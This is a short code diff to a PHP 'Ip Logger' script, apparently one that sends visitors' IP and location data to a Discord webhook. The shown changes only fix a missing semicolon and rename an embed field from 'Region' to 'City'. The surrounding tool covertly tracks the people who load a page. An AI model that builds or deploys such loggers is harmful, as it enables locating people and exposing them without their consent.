@@ -3,7 +3,7 @@
 $Webhook    = "https://discord.com/api/webhooks/"; //Webhook here
 $WebhookTag = "Ip Logger"; //Name this whatever you want
 $WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
-$DEmbedColor = "FFFFFF" // Change the color of the Discord Embed must be in hex "FFFFFF"
+$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
 
 //                        Dont Edit Unless You Know What You're Doing!
 //\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
@@ -108,7 +108,7 @@ $hookObject = json_encode([ // Discord Embed Message
                     "inline" => true
                 ],
                 [
-                    "name" => "Region",
+                    "name" => "City",
                     "value" => "$City",
                     "inline" => true
                 ],
